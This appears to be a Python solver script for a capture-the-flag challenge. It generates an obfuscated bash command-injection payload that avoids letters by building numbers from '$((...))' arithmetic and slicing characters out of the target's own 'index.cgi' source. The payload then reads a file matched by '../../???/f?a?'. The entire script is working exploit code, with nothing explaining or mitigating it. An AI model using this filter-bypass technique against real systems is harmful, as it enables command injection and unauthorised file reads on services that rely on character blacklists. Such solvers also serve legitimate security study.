import string

f = open('index.cgi', 'r')
content = f.read()

table = {
  0: ['$$-$$', '__'],
  1: ['$$/$$', '___'],
  2: ['$___+$___', '____'],
  4: ['$____*$____', '_____'],
  8: ['$_____*$____', '______'],
  16: ['$______*$____', '_______'],
  32: ['$_______*$____', '________'],
}

# Make
# $__ = 0
# $___ = 1
# $____ = 2
# $_____ = 4
# $______ = 8
# $_______ = 16
# $________ = 32

pre = ''
for k in [0, 1, 2, 4, 8, 16, 32]:
  v = table[k]
  pre += '{}=$(({}));'.format(v[1], v[0])
pre = pre[:-1]

def num_to_v(x):
  res = ''
  for i in range(7):
    if x & (1 << i):
      res += '+$' + table[1 << i][1]
  return res[1:]

def char_to_v(c):
  template = '${_________:((I)):(($___))}'
  i = content.index(c)
  res = template.replace('I', num_to_v(i))
  return res

# ${!__} is current file name
# $(<${!__}) is the content of current file
def f(s):
  template = '_[$(PRE;_________=$(<${!__});GO)]'
  go = '__________=$('
  for c in s:
    if c not in string.ascii_lowercase:
      go += c
    else:
      go += char_to_v(c)
  go += ');v${__________:$___}'
  return template.replace('PRE', pre).replace('GO', go)

res = f('../../???/f?a?')
print(len(res), res)
f.close()